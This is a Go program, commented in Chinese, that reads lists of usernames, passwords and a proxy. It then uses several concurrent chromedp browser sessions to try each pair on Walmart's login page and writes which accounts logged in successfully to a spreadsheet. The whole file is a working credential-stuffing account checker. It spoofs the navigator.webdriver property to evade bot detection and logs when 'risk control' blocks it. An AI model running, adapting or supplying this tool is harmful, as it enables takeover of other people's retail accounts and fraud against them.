package main

import (
	"bufio"
	"fmt"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/chromedp"
	"github.com/chromedp/chromedp/kb"
	"github.com/xuri/excelize/v2"
	"golang.org/x/net/context"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var lock sync.Mutex
var wg = sync.WaitGroup{}

var (
	IO = 0

	LogutUrl    = "https://www.walmart.com/account/logout"
	LoginUrl    = "https://www.walmart.com/account/login"
	emailCss    = "input[type=email]"
	passwordCss = "input[type=password]"
	loginCss    = "button[type=submit]"
	ZH          []User
	prxoy       string
)

type User struct {
	Username string
	Password string
	State    string
}

func main() {
	fi, err := os.Open("账号密码.txt")
	if err != nil {
		panic(err)
	}
	r := bufio.NewReader(fi) // 创建 Reader
	file, err := os.ReadFile("代理.txt")
	if err != nil {
		panic(err)
	}
	prxoy = string(file)
	for {
		lineB, err := r.ReadBytes('\n')
		if len(lineB) > 0 {
			space := strings.TrimSpace(string(lineB))
			split := strings.Split(space, ",")
			ZH = append(ZH, User{split[0], split[1], ""})
		}
		if err != nil {
			break
		}

	}

	for i := 0; i <= 5; i++ {
		wg.Add(1)
		go login()
	}
	wg.Wait()

	xlsx := excelize.NewFile()

	num := 2
	if err := xlsx.SetSheetRow("Sheet1", "A1", &[]interface{}{"账号", "密码", "状态"}); err != nil {
		log.Println(err)
	}
	for i := range ZH {
		if err := xlsx.SetSheetRow("Sheet1", "A"+strconv.Itoa(num), &[]interface{}{ZH[i].Username, ZH[i].Password, ZH[i].State}); err != nil {
			log.Println(err)
		}
		num++
	}

	fileName := "out.xlsx"
	for fileNum := 1; exists(fileName); fileNum++ {
		fileName = "out(" + strconv.Itoa(fileNum) + ").xlsx"
	}
	xlsx.SaveAs(fileName)

	log.Println("完成")

}
func exists(path string) bool {
	_, err := os.Stat(path) //os.Stat获取文件信息
	if err != nil {
		if os.IsExist(err) {
			return true
		}
		return false
	}
	return true
}
func login() {
	defer wg.Done()
	//配置
	options := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.ProxyServer(prxoy),    //代理
		chromedp.NoDefaultBrowserCheck, //不检查默认浏览器
		chromedp.Flag("headless", false),
		chromedp.WindowSize(10, 10),                            // 设置浏览器分辨率（窗口大小）
		chromedp.Flag("blink-settings", "imagesEnabled=false"), //开启图像界面,重点是开启这个
		chromedp.UserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"), //设置UserAgent
	)
	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), options...)
	defer cancel()
	// 初始化chromedp上下文，后续这个页面都使用这个上下文进行操作
	ctx, cancel := chromedp.NewContext(allocCtx, chromedp.WithLogf(log.Printf))
	defer cancel()
	// 设置超时时间
	ctx, cancel = context.WithTimeout(ctx, 300*time.Second)
	defer cancel()
	err := chromedp.Run(ctx,
		//设置webdriver检测反爬
		chromedp.ActionFunc(func(cxt context.Context) error {
			_, err := page.AddScriptToEvaluateOnNewDocument("Object.defineProperty(navigator, 'webdriver', { get: () => false, });").Do(cxt)
			return err
		}),
		foLLogin(),
		//停止网页加载
		chromedp.Stop(),
	)

	if err != nil {
		fmt.Println(err)
	}
}

func getV() *User {
	lock.Lock()
	defer lock.Unlock()
	var u *User
	if IO < len(ZH) {
		u = &ZH[IO]
		IO++
	}
	return u

}

func foLLogin() chromedp.ActionFunc {
	return func(ctx context.Context) (err error) {
		for {
			u := getV()
			if u == nil {
				return
			}
			//退出登录
			chromedp.Navigate(LogutUrl).Do(ctx)
			//等待一秒
			chromedp.Sleep(time.Second * 1).Do(ctx)
			//打开登录页面
			chromedp.Navigate(LoginUrl).Do(ctx)
			timeout1, cancel1 := context.WithTimeout(ctx, 5*time.Second)
			defer cancel1()
			//输入邮箱
			err = chromedp.SendKeys(emailCss, u.Username+kb.Enter).Do(timeout1)
			if err != nil {
				u.State = "遇到风控，检测失败"
				log.Println(u.Username, "无法输入账号可能遇到风控，程序即将停止")
				return
			}
			//等待一秒
			chromedp.Sleep(time.Second * 1).Do(ctx)
			//点击元素
			//chromedp.Click(loginCss).Do(ctx)
			//等待一秒
			chromedp.Sleep(time.Second * 1).Do(ctx)
			timeout2, cancel2 := context.WithTimeout(ctx, 5*time.Second)
			defer cancel2()
			//输入密码
			err = chromedp.SendKeys(passwordCss, u.Password+kb.Enter).Do(timeout2)
			if err != nil {
				u.State = "遇到风控，检测失败"
				log.Println(u.Username, "无法输入密码可能遇到风控，程序即将停止")
				return
			}
			//等待一秒
			chromedp.Sleep(time.Second * 1).Do(ctx)
			//点击元素
			//chromedp.Click(loginCss).Do(ctx)
			//等待一秒
			chromedp.Sleep(time.Second * 1).Do(ctx)
			timeout3, cancel3 := context.WithTimeout(ctx, 10*time.Second)
			defer cancel3()
			err = chromedp.WaitVisible("#__next > div:nth-child(1) > div > span > header > form > div > input").Do(timeout3)
			if err != nil {
				u.State = "登录失败"
				log.Println(u.Username, "登录失败")
			} else {
				u.State = "登录成功"
				log.Println(u.Username, "登录成功")
			}
			time.Sleep(2 * time.Second)
		}

		return
	}
}
